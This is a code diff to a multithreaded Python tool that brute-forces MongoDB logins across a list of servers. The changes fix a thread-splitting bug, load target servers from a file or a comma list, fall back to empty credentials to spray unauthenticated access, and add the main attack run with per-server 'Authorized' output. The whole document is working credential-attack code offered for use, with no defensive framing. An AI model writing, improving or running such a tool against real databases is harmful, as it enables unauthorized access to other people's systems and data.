@@ -1,4 +1,4 @@
-#! /usr/bine/env python3
+#! /usr/bin/env python3
 
 from pymongo import MongoClient
 from urllib.parse import quote
@@ -47,13 +47,13 @@ def brute_force(thread_index, servers, credentials):
             if status[0] == True:
                 successful_logins[server] = [credential[0], credential[1]]
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
             elif status[0] == False:
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
             else:
                 with lock:
-                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
 def main(servers, credentials):
     successful_logins = {}
@@ -62,7 +62,7 @@ def main(servers, credentials):
     display(':', f"Credentials / Threads = {Back.MAGENTA}{len(credentials)//thread_count}{Back.RESET}")
     threads = []
     total_servers = len(servers)
-    server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(total_servers)]
+    server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
     for index, server_division in enumerate(server_divisions):
         threads.append(pool.apply_async(brute_force, (index, server_division, credentials)))
     for thread in threads:
@@ -81,10 +81,20 @@ if __name__ == "__main__":
     if not arguments.server:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
         exit(0)
+    else:
+        try:
+            with open(arguments.server, 'r') as file:
+                arguments.server = [server for server in file.read().split('\n') if server != '']
+        except FileNotFoundError:
+            arguments.server = arguments.server.split(',')
+        except Exception as error:
+            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
+            exit(0)
     if not arguments.credentials:
         if not arguments.users:
-            display('-', f"Please specify {Back.YELLOW}Target Users{Back.RESET}")
-            exit(0)
+            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
+            arguments.users = ['']
+            arguments.password = ['']
         else:
             try:
                 with open(arguments.users, 'r') as file:
@@ -98,7 +108,7 @@ if __name__ == "__main__":
         if not arguments.password:
             display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
             exit(0)
-        else:
+        elif arguments.password != ['']:
             try:
                 with open(arguments.password, 'r') as file:
                     arguments.password = [password for password in file.read().split('\n') if password != '']
@@ -121,3 +131,8 @@ if __name__ == "__main__":
             exit(0)
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
+    display('+', f"Total Servers     = {Back.MAGENTA}{len(arguments.server)}{Back.RESET}")
+    display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
+    t1 = time()
+    successful_logins = main(arguments.server, arguments.credentials)
+    t2 = time()
